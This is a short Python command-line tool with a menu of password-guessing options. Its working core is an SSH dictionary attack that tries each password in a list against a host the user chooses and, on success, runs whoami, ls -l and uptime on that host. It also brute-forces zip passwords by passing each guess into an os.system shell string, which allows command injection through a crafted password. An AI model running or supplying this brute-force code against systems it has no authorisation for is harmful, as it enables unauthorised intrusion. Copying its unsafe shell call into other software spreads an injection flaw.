import time
import paramiko
import os

def ssh_connect(host, port, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, user, password)
        return ssh, True
    except paramiko.AuthenticationException:
        return None, False

def offensive_mode(filepath):
    print("Offensive mode selected. This option is not implemented in this example.")

def defensive_mode(word, filepath):
    with open(filepath, 'r') as file:
        words = file.read().splitlines()
        if word in words:
            print("Word found in list.")
        else:
            print("Word not found.")

def ssh_login_test(host, user, filepath):
    with open(filepath, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Trying password: {password}")
            ssh, success = ssh_connect(host, 22, user, password)
            if success:
                print("____________________________________________")
                print(f"Success! Password is: {password}")
                print("____________________________________________")

                # Execute and display the output of 'whoami'
                stdin, stdout, stderr = ssh.exec_command("whoami")
                print("____________________________________________")
                print("User:", stdout.read().decode().strip())
                print("____________________________________________")

                # Execute and display the output of 'ls -l'
                stdin, stdout, stderr = ssh.exec_command("ls -l")
                print("____________________________________________")
                print("Directory Listing:\n", stdout.read().decode().strip())
                print("____________________________________________")

                # Execute and display the output of 'uptime'
                stdin, stdout, stderr = ssh.exec_command("uptime")
                print("____________________________________________")
                print("System Uptime:", stdout.read().decode().strip())
                print("____________________________________________")

                ssh.close()
                break
            time.sleep(1)

def unzip_password_protected_file(zip_filepath, password_list_path):
    with open(password_list_path, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")
            # Use os.system to run the unzip command
            command = f'unzip -P \'{password}\' \'{zip_filepath}\''
            status = os.system(command)
            if status == 0:  # Command was successful
                print("____________________________________________")
                print(f"Success! Password is: {password}")
                print("____________________________________________")
                break
            else:
                print("Failed with password:", password)
            time.sleep(1)

def main():
    choose = "Choose an option"
    print(f"{choose:^60}")
    print("Option 1: Offensive; Dictionary Iterator")
    print("Option 2: Defensive; Password Recognized")
    print("Option 3: SSH Login Test")
    print("Option 4: Unzip Password-Protected File")

    option = input("Your choice: ")

    if option == "1":
        filepath = input("Enter file path for the dictionary: ")
        offensive_mode(filepath)
    elif option == "2":
        usrinput = input("Enter word: ")
        filepath = input("Enter file path for word list: ")
        defensive_mode(usrinput, filepath)
    elif option == "3":
        host = input("IP: ")
        user = input("Username: ")
        filepath = input("Enter file path for password list: ")
        ssh_login_test(host, user, filepath)
    elif option == "4":
        zip_filepath = input("Enter file path for the zip file: ")
        password_list_path = input("Enter file path for password list: ")
        unzip_password_protected_file(zip_filepath, password_list_path)
    else:
        print("Invalid option, please choose 1, 2, 3, or 4.")

if __name__ == "__main__":
    main()
